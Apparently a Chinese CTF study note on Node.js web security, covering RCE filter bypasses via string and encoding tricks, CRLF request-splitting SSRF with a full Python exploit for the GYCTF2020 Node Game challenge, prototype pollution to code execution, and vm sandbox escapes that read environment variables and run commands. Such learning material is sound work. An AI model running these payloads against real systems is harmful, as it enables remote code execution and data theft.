class="line">console.log(&quot;a&quot;===&quot;\x61&quot;); // true</span><br><span class="line">unicode编码</span><br><span class="line"></span><br><span class="line">js</span><br><span class="line">console.log(&quot;\u0061&quot;===&quot;a&quot;); // true</span><br><span class="line">base编码</span><br><span class="line"></span><br><span class="line">js</span><br><span class="line">eval(Buffer.from(&#x27;Y29uc29sZS5sb2coImhhaGFoYWhhIik7&#x27;,&#x27;base64&#x27;).toString())</span><br><span class="line">1.3 nodejs危险函数的利用</span><br><span class="line">1.3.1 nodejs危险函数-命令执行</span><br><span class="line">exec()</span><br><span class="line"></span><br><span class="line">js</span><br><span class="line">require(&#x27;child_process&#x27;).exec(&#x27;open /System/Applications/Calculator.app&#x27;);</span><br><span class="line">eval()</span><br><span class="line"></span><br><span class="line">js</span><br><span class="line">console.log(eval(&quot;document.cookie&quot;)); //执行document.cookie</span><br><span class="line">console.log(&quot;document.cookie&quot;); //输出document.cookie</span><br><span class="line">1.3.2 nodejs危险函数-文件读写</span><br><span class="line">读</span><br><span class="line"></span><br><span class="line">readFileSync()</span><br><span class="line"></span><br><span class="line">js</span><br><span class="line">require(&#x27;fs&#x27;).readFile(&#x27;/etc/passwd&#x27;, &#x27;utf-8&#x27;, (err, data) =&gt; &#123;</span><br><span class="line"> if (err) throw err;</span><br><span class="line"> console.log(data);</span><br><span class="line">&#125;);</span><br><span class="line">readFile()</span><br><span class="line"></span><br><span class="line">js</span><br><span class="line">require(&#x27;fs&#x27;).readFileSync(&#x27;/etc/passwd&#x27;,&#x27;utf-8&#x27;)</span><br><span class="line">写</span><br><span class="line"></span><br><span class="line">writeFileSync()</span><br><span class="line"></span><br><span class="line">js</span><br><span class="line">require(&#x27;fs&#x27;).writeFileSync(&#x27;input.txt&#x27;,&#x27;sss&#x27;);</span><br><span class="line">writeFile()</span><br><span class="line"></span><br><span class="line">js</span><br><span class="line">require(&#x27;fs&#x27;).writeFile(&#x27;input.txt&#x27;,&#x27;test&#x27;,(err)=&gt;&#123;&#125;)</span><br><span class="line">1.3.3 nodejs危险函数-RCE bypass</span><br><span class="line">bypass</span><br><span class="line"></span><br><span class="line">原型：</span><br><span class="line"></span><br><span class="line">js</span><br><span class="line">require(&quot;child_process&quot;).execSync(&#x27;cat flag.txt&#x27;)</span><br><span class="line">字符拼接：</span><br><span class="line"></span><br><span class="line">js</span><br><span class="line">require(&quot;child_process&quot;)[&#x27;exe&#x27;%2b&#x27;cSync&#x27;](&#x27;cat flag.txt&#x27;)</span><br><span class="line">//(%2b就是+的url编码)</span><br><span class="line"></span><br><span class="line">require(&#x27;child_process&#x27;)[&quot;exe&quot;.concat(&quot;cSync&quot;)](&quot;open /System/Applications/Calculator.app/&quot;)</span><br><span class="line">编码绕过：</span><br><span class="line"></span><br><span class="line">js</span><br><span class="line">require(&quot;child_process&quot;)[&quot;\x65\x78\x65\x63\x53\x79\x6e\x63&quot;](&#x27;cat flag.txt&#x27;)</span><br><span class="line">require(&quot;child_process&quot;)[&quot;\u0065\u0078\u0065\u0063\u0053\x79\x6e\x63&quot;](&#x27;cat fl001g.txt&#x27;)</span><br><span class="line">eval(Buffer.from(&#x27;cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCdvcGVuIC9TeXN0ZW0vQXBwbGljYXRpb25zL0NhbGN1bGF0b3IuYXBwLycpOw==&#x27;,&#x27;base64&#x27;).toString()) //弹计算器</span><br><span class="line">模板拼接：</span><br><span class="line"></span><br><span class="line">js</span><br><span class="line">require(&quot;child_process&quot;)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](&#x27;open /System/Applications/Calculator.app/&#x27;）</span><br><span class="line">其他函数：</span><br><span class="line"></span><br><span class="line">js</span><br><span class="line">require(&quot;child_process&quot;).exec(&quot;sleep 3&quot;); </span><br><span class="line">require(&quot;child_process&quot;).execSync(&quot;sleep 3&quot;); </span><br><span class="line">require(&quot;child_process&quot;).execFile(&quot;/bin/sleep&quot;,[&quot;3&quot;]); *//调用某个可执行文件，在第二个参数传args* </span><br><span class="line">require(&quot;child_process&quot;).spawn(&#x27;sleep&#x27;, [&#x27;3&#x27;]); </span><br><span class="line">require(&quot;child_process&quot;).spawnSync(&#x27;sleep&#x27;, [&#x27;3&#x27;]); </span><br><span class="line">require(&quot;child_process&quot;).execFileSync(&#x27;sleep&#x27;, [&#x27;3&#x27;]);</span><br><span class="line">1.4 nodejs中的ssrf</span><br><span class="line">1.4.1 通过拆分请求实现的ssrf攻击</span><br><span class="line">原理</span><br><span class="line"></span><br><span class="line">虽然用户发出的http请求通常将请求路径指定为字符串，但Node.js最终必须将请求作为原始字节输出。JavaScript支持unicode字符串，因此将它们转换为字节意味着选择并应用适当的unicode编码。对于不包含主体的请求，Node.js默认使用“latin1”，这是一种单字节编码，不能表示高编号的unicode字符。相反，这些字符被截断为其JavaScript表示的最低字节</span><br><span class="line"></span><br><span class="line">js</span><br><span class="line">&gt; v = &quot;/caf\u&#123;E9&#125;\u&#123;01F436&#125;&quot;</span><br><span class="line">&#x27;/café🐶&#x27;</span><br><span class="line"></span><br><span class="line">&gt; Buffer.from(v,&#x27;latin1&#x27;).toString(&#x27;latin1&#x27;)</span><br><span class="line">&#x27;/café=6&#x27;</span><br><span class="line">Crlf HTTP头注入:</span><br><span class="line"></span><br><span class="line">js</span><br><span class="line">&gt; require(&#x27;http&#x27;).get(&#x27;http://example.com/\r\n/test&#x27;)._header</span><br><span class="line">&#x27;GET //test HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n&#x27;</span><br><span class="line">通过crlf结合ssrf利用</span><br><span class="line"></span><br><span class="line">题目连接：</span><br><span class="line"></span><br><span class="line">https://buuoj.cn/challenges#[GYCTF2020]Node%20Game</span><br><span class="line"></span><br><span class="line">源码：</span><br><span class="line"></span><br><span class="line">js</span><br><span class="line">var express = require(&#x27;express&#x27;); </span><br><span class="line">var app = express(); </span><br><span class="line">var fs = require(&#x27;fs&#x27;); </span><br><span class="line">var path = require(&#x27;path&#x27;); // 处理文件路径 </span><br><span class="line">var http = require(&#x27;http&#x27;); </span><br><span class="line">var pug = require(`pug`); // 模板渲染 </span><br><span class="line">var morgan = require(&#x27;morgan&#x27;); // 日志 </span><br><span class="line">const multer = require(&#x27;multer&#x27;); // 用于处理multipart/form-data类型的表单数据，实现上传功能</span><br><span class="line"></span><br><span class="line">// 将上传的文件存储在./dist[自动创建]返回一个名为file的文件数组 </span><br><span class="line">app.use(multer(&#123;dest: &#x27;./dist&#x27;&#125;).array(&#x27;file&#x27;)); </span><br><span class="line">// 使用简化版日志 </span><br><span class="line">app.use(morgan(&#x27;short&#x27;));  </span><br><span class="line"></span><br><span class="line">// 静态文件路由 </span><br><span class="line">app.use(&quot;/uploads&quot;, express.static(path.join(__dirname, &#x27;/uploads&#x27;))) </span><br><span class="line">app.use(&quot;/template&quot;, express.static(path.join(__dirname, &#x27;/template&#x27;)))  </span><br><span class="line">app.get(&#x27;/&#x27;, function (req, res) &#123;    </span><br><span class="line">  // GET方法获取action参数    </span><br><span class="line">  var action = req.query.action ? req.query.action : &quot;index&quot;;    </span><br><span class="line">  // action中不能包含/ &amp; \    </span><br><span class="line">  if (action.includes(&quot;/&quot;) || action.includes(&quot;\\&quot;)) &#123;        </span><br><span class="line">    res.send(&quot;Errrrr, You have been Blocked&quot;);    </span><br><span class="line">  &#125;    </span><br><span class="line">  </span><br><span class="line">  // 将/template/[action].pug渲染成html输出到根目录    </span><br><span class="line">  file = path.join(__dirname + &#x27;/template/&#x27; + action + &#x27;.pug&#x27;);    </span><br><span class="line">  var html = pug.renderFile(file);    </span><br><span class="line">  res.send(html); </span><br><span class="line">&#125;);  </span><br><span class="line"></span><br><span class="line">app.post(&#x27;/file_upload&#x27;, function (req, res) &#123;    </span><br><span class="line">  var ip = req.connection.remoteAddress; // remoteAddress无法伪造，因为TCP有三次握手，伪造源IP会导致无法完成TCP连接    </span><br><span class="line">  var obj = &#123;msg: &#x27;&#x27;,&#125;    </span><br><span class="line">  // 请求必须来自localhost    </span><br><span class="line">  if (!ip.includes(&#x27;127.0.0.1&#x27;)) &#123;        </span><br><span class="line">    obj.msg = &quot;only admin&#x27;s ip can use it&quot;        </span><br><span class="line">    res.send(JSON.stringify(obj));        </span><br><span class="line">    return    </span><br><span class="line">  &#125;    </span><br><span class="line">  fs.readFile(req.files[0].path, function (err, data) &#123;        </span><br><span class="line">    if (err) &#123;            </span><br><span class="line">      obj.msg = &#x27;upload failed&#x27;;            </span><br><span class="line">      res.send(JSON.stringify(obj));        </span><br><span class="line">    &#125; else &#123;            </span><br><span class="line">      // 文件路径为/uploads/[mimetype]/filename，mimetype可以进行目录穿越实现将文件存储至/template并利用action渲染到界面            </span><br><span class="line">      var file_path = &#x27;/uploads/&#x27; + req.files[0].mimetype + &quot;/&quot;;            </span><br><span class="line">      var file_name = req.files[0].originalname            </span><br><span class="line">      var dir_file = __dirname + file_path + file_name            </span><br><span class="line">      if (!fs.existsSync(__dirname + file_path)) &#123;                </span><br><span class="line">        try &#123;                    </span><br><span class="line">          fs.mkdirSync(__dirname + file_path)                </span><br><span class="line">        &#125; catch (error) &#123;                    </span><br><span class="line">          obj.msg = &quot;file type error&quot;;                    </span><br><span class="line">          res.send(JSON.stringify(obj));                    </span><br><span class="line">          return                </span><br><span class="line">        &#125;            </span><br><span class="line">      &#125;            </span><br><span class="line">      try &#123;                </span><br><span class="line">        fs.writeFileSync(dir_file, data)                </span><br><span class="line">        obj = &#123;msg: &#x27;upload success&#x27;, filename: file_path + file_name&#125;            </span><br><span class="line">      &#125; catch (error) &#123;                </span><br><span class="line">        obj.msg = &#x27;upload failed&#x27;;            </span><br><span class="line">      &#125;            </span><br><span class="line">      res.send(JSON.stringify(obj));        </span><br><span class="line">    &#125;    </span><br><span class="line">  &#125;) </span><br><span class="line">&#125;)  </span><br><span class="line"></span><br><span class="line">// 查看题目源码 </span><br><span class="line">app.get(&#x27;/source&#x27;, function (req, res) &#123;    </span><br><span class="line">  res.sendFile(path.join(__dirname + &#x27;/template/source.txt&#x27;)); &#125;);  </span><br><span class="line">app.get(&#x27;/core&#x27;, function (req, res) &#123;    </span><br><span class="line">  var q = req.query.q;    </span><br><span class="line">  var resp = &quot;&quot;;    </span><br><span class="line">  if (q) &#123;        </span><br><span class="line">    var url = &#x27;http://localhost:8081/source?&#x27; + q        </span><br><span class="line">    console.log(url)        </span><br><span class="line">   </span><br><span class="line">    // 对url字符进行waf        </span><br><span class="line">    var trigger = blacklist(url);        </span><br><span class="line">    if (trigger === true) &#123;            </span><br><span class="line">      res.send(&quot;error occurs!&quot;);        </span><br><span class="line">    &#125; else &#123;            </span><br><span class="line">      try &#123;                </span><br><span class="line">      </span><br><span class="line">        // node对/source发出请求，此处可以利用字符破坏进行切分攻击访问/file_upload路由(❗️此请求发出者为localhost主机)，实现对remoteAddress的绕过                </span><br><span class="line">        http.get(url, function (resp) &#123;                    </span><br><span class="line">          resp.setEncoding(&#x27;utf8&#x27;);                    </span><br><span class="line">          resp.on(&#x27;error&#x27;, function (err) &#123;                        </span><br><span class="line">            if (err.code === &quot;ECONNRESET&quot;) &#123;                            </span><br><span class="line">              console.log(&quot;Timeout occurs&quot;);                        </span><br><span class="line">            &#125;                    </span><br><span class="line">          &#125;);                    </span><br><span class="line">          </span><br><span class="line">          // 返回结果输出到/core                    </span><br><span class="line">          resp.on(&#x27;data&#x27;, function (chunk) &#123;                        </span><br><span class="line">            try &#123;                            </span><br><span class="line">              resps = chunk.toString();                            </span><br><span class="line">              res.send(resps);                        </span><br><span class="line">            &#125; catch (e) &#123;                            </span><br><span class="line">              res.send(e.message);                        </span><br><span class="line">            &#125;                    </span><br><span class="line">          &#125;).on(&#x27;error&#x27;, (e) =&gt; &#123;                        </span><br><span class="line">            res.send(e.message);                    </span><br><span class="line">          &#125;);                </span><br><span class="line">        &#125;);            </span><br><span class="line">      &#125; catch (error) &#123;                </span><br><span class="line">        console.log(error);            </span><br><span class="line">      &#125;        </span><br><span class="line">    &#125;    </span><br><span class="line">  &#125; else &#123;        </span><br><span class="line">    res.send(&quot;search param &#x27;q&#x27; missing!&quot;);    </span><br><span class="line">  &#125; </span><br><span class="line">&#125;)  </span><br><span class="line">// 关键字waf 利用字符串拼接实现绕过 </span><br><span class="line">function blacklist(url) &#123;    </span><br><span class="line">  var evilwords = [&quot;global&quot;, &quot;process&quot;, &quot;mainModule&quot;, &quot;require&quot;, &quot;root&quot;, &quot;child_process&quot;, &quot;exec&quot;, &quot;\&quot;&quot;, &quot;&#x27;&quot;, &quot;!&quot;];    </span><br><span class="line">  var arrayLen = evilwords.length;     </span><br><span class="line">  for (var i = 0; i &lt; arrayLen; i++) &#123;        </span><br><span class="line">    const trigger = url.includes(evilwords[i]);        </span><br><span class="line">    if (trigger === true) &#123;            </span><br><span class="line">      return true        </span><br><span class="line">    &#125;    </span><br><span class="line">  &#125; </span><br><span class="line">&#125;  </span><br><span class="line">var server = app.listen(8081, function () &#123;    </span><br><span class="line">  var host = server.address().address    </span><br><span class="line">  var port = server.address().port    </span><br><span class="line">  console.log(&quot;Example app listening at http://%s:%s&quot;, host, port) </span><br><span class="line">&#125;)</span><br><span class="line">exp：</span><br><span class="line"></span><br><span class="line">python</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">payload = &quot;&quot;&quot; HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">POST /file_upload HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: &#123;&#125;</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryZUlQgK81vgN7OB8A</span><br><span class="line"></span><br><span class="line">&#123;&#125;&quot;&quot;&quot;.replace(&#x27;\n&#x27;, &#x27;\r\n&#x27;)</span><br><span class="line"></span><br><span class="line">body = &quot;&quot;&quot;------WebKitFormBoundaryZUlQgK81vgN7OB8A</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;lethe.pug&quot;</span><br><span class="line">Content-Type: ../template</span><br><span class="line"></span><br><span class="line">-var x = eval(&quot;glob&quot;+&quot;al.proce&quot;+&quot;ss.mainMo&quot;+&quot;dule.re&quot;+&quot;quire(&#x27;child_&#x27;+&#x27;pro&#x27;+&#x27;cess&#x27;)[&#x27;ex&#x27;+&#x27;ecSync&#x27;](&#x27;cat /flag.txt&#x27;).toString()&quot;)</span><br><span class="line">-return x</span><br><span class="line">------WebKitFormBoundaryZUlQgK81vgN7OB8A--</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;.replace(&#x27;\n&#x27;, &#x27;\r\n&#x27;)</span><br><span class="line"></span><br><span class="line">payload = payload.format(len(body), body) \</span><br><span class="line">    .replace(&#x27;+&#x27;, &#x27;\u012b&#x27;)             \</span><br><span class="line">    .replace(&#x27; &#x27;, &#x27;\u0120&#x27;)             \</span><br><span class="line">    .replace(&#x27;\r\n&#x27;, &#x27;\u010d\u010a&#x27;)    \</span><br><span class="line">    .replace(&#x27;&quot;&#x27;, &#x27;\u0122&#x27;)             \</span><br><span class="line">    .replace(&quot;&#x27;&quot;, &#x27;\u0a27&#x27;)             \</span><br><span class="line">    .replace(&#x27;[&#x27;, &#x27;\u015b&#x27;)             \</span><br><span class="line">    .replace(&#x27;]&#x27;, &#x27;\u015d&#x27;) \</span><br><span class="line">    + &#x27;GET&#x27; + &#x27;\u0120&#x27; + &#x27;/&#x27;</span><br><span class="line"></span><br><span class="line">requests.get(&#x27;http://ec05f88c-b4d9-4408-bdc5-56e251328bb1.node4.buuoj.cn:81/core?q=&#x27; + payload)</span><br><span class="line"></span><br><span class="line">print(requests.get(&#x27;http://ec05f88c-b4d9-4408-bdc5-56e251328bb1.node4.buuoj.cn:81/?action=lethe&#x27;).text)</span><br><span class="line">https://xz.aliyun.com/t/2894#toc-2</span><br><span class="line"></span><br><span class="line">2 nodejs原型链污染</span><br><span class="line">2.1 prototype原型</span><br><span class="line">简介：</span><br><span class="line"></span><br><span class="line">对于使用过基于类的语言 (如 Java 或 C++) 的开发者们来说，JavaScript 实在是有些令人困惑 —— JavaScript 是动态的，本身不提供一个 class 的实现。即便是在 ES2015/ES6 中引入了 class 关键字，但那也只是语法糖，JavaScript 仍然是基于原型的。</span><br><span class="line"></span><br><span class="line">当谈到继承时，JavaScript 只有一种结构：对象。每个实例对象（object）都有一个私有属性（称之为 proto ）指向它的构造函数的原型对象（prototype）。该原型对象也有一个自己的原型对象（__proto__），层层向上直到一个对象的原型对象为 null。根据定义，null 没有原型，并作为这个原型链中的最后一个环节。</span><br><span class="line"></span><br><span class="line">几乎所有 JavaScript 中的对象都是位于原型链顶端的 Object 的实例。</span><br><span class="line"></span><br><span class="line">尽管这种原型继承通常被认为是 JavaScript 的弱点之一，但是原型继承模型本身实际上比经典模型更强大。例如，在原型模型的基础上构建经典模型相当简单。</span><br><span class="line"></span><br><span class="line">js</span><br><span class="line">function Foo(name,age)&#123;</span><br><span class="line">this.name=name;</span><br><span class="line">this.age=age;</span><br><span class="line">&#125;</span><br><span class="line">Object.prototype.toString=function()&#123;</span><br><span class="line">console.log(&quot;I&#x27;m &quot;+this.name+&quot; And I&#x27;m &quot;+this.age);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var fn=new Foo(&#x27;xiaoming&#x27;,19);</span><br><span class="line">fn.toString();</span><br><span class="line">console.log(fn.toString===Foo.prototype.__proto__.toString);</span><br><span class="line"></span><br><span class="line">console.log(fn.__proto__===Foo.prototype)</span><br><span class="line">console.log(Foo.prototype.__proto__===Object.prototype)</span><br><span class="line">console.log(Object.prototype.__proto__===null)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2.2 原型链污染原理</span><br><span class="line">在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是原型链污染。</span><br><span class="line"></span><br><span class="line">js</span><br><span class="line">// foo是一个简单的JavaScript对象</span><br><span class="line">let foo = &#123;bar: 1&#125;</span><br><span class="line"></span><br><span class="line">// foo.bar 此时为1</span><br><span class="line">console.log(foo.bar)</span><br><span class="line"></span><br><span class="line">// 修改foo的原型（即Object）</span><br><span class="line">foo.__proto__.bar = 2</span><br><span class="line"></span><br><span class="line">// 由于查找顺序的原因，foo.bar仍然是1</span><br><span class="line">console.log(foo.bar)</span><br><span class="line"></span><br><span class="line">// 此时再用Object创建一个空的zoo对象</span><br><span class="line">let zoo = &#123;&#125;</span><br><span class="line"></span><br><span class="line">// 查看zoo.bar，此时bar为2</span><br><span class="line">console.log(zoo.bar)</span><br><span class="line">2.3 原型链污染配合RCE</span><br><span class="line">有原型链污染的前提之下，我们可以控制基类的成员，赋值为一串恶意代码，从而造成代码注入。</span><br><span class="line"></span><br><span class="line">js</span><br><span class="line">let foo = &#123;bar: 1&#125;</span><br><span class="line"></span><br><span class="line">console.log(foo.bar)</span><br><span class="line"></span><br><span class="line">foo.__proto__.bar = &#x27;require(\&#x27;child_process\&#x27;).execSync(\&#x27;open /System/Applications/Calculator.app/\&#x27;);&#x27;</span><br><span class="line"></span><br><span class="line">console.log(foo.bar)</span><br><span class="line"></span><br><span class="line">let zoo = &#123;&#125;</span><br><span class="line"></span><br><span class="line">console.log(eval(zoo.bar))</span><br><span class="line">3 vm沙箱逃逸</span><br><span class="line">vm是用来实现一个沙箱环境，可以安全的执行不受信任的代码而不会影响到主程序。但是可以通过构造语句来进行逃逸</span><br><span class="line"></span><br><span class="line">逃逸例子：</span><br><span class="line"></span><br><span class="line">js</span><br><span class="line">const vm = require(&quot;vm&quot;);</span><br><span class="line">const env = vm.runInNewContext(`this.constructor.constructor(&#x27;return this.process.env&#x27;)()`);</span><br><span class="line">console.log(env);</span><br><span class="line">js</span><br><span class="line">const vm = require(&#x27;vm&#x27;);</span><br><span class="line">const sandbox = &#123;&#125;;</span><br><span class="line">const script = new vm.Script(&quot;this.constructor.constructor(&#x27;return this.process.env&#x27;)()&quot;);</span><br><span class="line">const context = vm.createContext(sandbox);</span><br><span class="line">env = script.runInContext(context);</span><br><span class="line">console.log(env);</span><br><span class="line">执行以上两个例子之后可以获取到主程序环境中的环境变量（两个例子代码等价）</span><br><span class="line"></span><br><span class="line">创建vm环境时，首先要初始化一个对象 sandbox，这个对象就是vm中脚本执行时的全局环境context，vm 脚本中全局 this 指向的就是这个对象。</span><br><span class="line"></span><br><span class="line">因为this.constructor.constructor返回的是一个Function constructor，所以可以利用Function对象构造一个函数并执行。(此时Function对象的上下文环境是处于主程序中的) 这里构造的函数内的语句是return this.process.env，结果是返回了主程序的环境变量。</span><br><span class="line"></span><br><span class="line">配合chile_process.exec()就可以执行任意命令了：</span><br><span class="line"></span><br><span class="line">js</span><br><span class="line">const vm = require(&quot;vm&quot;);</span><br><span class="line">const env = vm.runInNewContext(`const process = this.constructor.constructor(&#x27;return this.process&#x27;)();</span><br><span class="line">process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString()`);</span><br><span class="line">console.log(env);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br></pre></td><td class="code"><pre><span class="line">Node.js 常见漏洞学习与总结</span><br><span class="line"></span><br><span class="line">Threezh1 / 2020-02-11 08:58:36 / 浏览数 30605 社区板块 WEB安全顶(5) 踩(0)</span><br><span class="line">危险函数所导致的命令执行</span><br><span class="line">eval()</span><br><span class="line">eval() 函数可计算某个字符串，并执行其中的的 JavaScript 代码。和PHP中eval函数一样，如果传递到函数中的参数可控并且没有经过严格的过滤时，就会导致漏洞的出现。</span><br><span class="line"></span><br><span class="line">简单例子：</span><br><span class="line"></span><br><span class="line">main.js</span><br><span class="line"></span><br><span class="line">var express = require(&quot;express&quot;);</span><br><span class="line">var app = express();</span><br><span class="line"></span><br><span class="line">app.get(&#x27;/eval&#x27;,function(req,res)&#123;</span><br><span class="line">    res.send(eval(req.query.q));</span><br><span class="line">    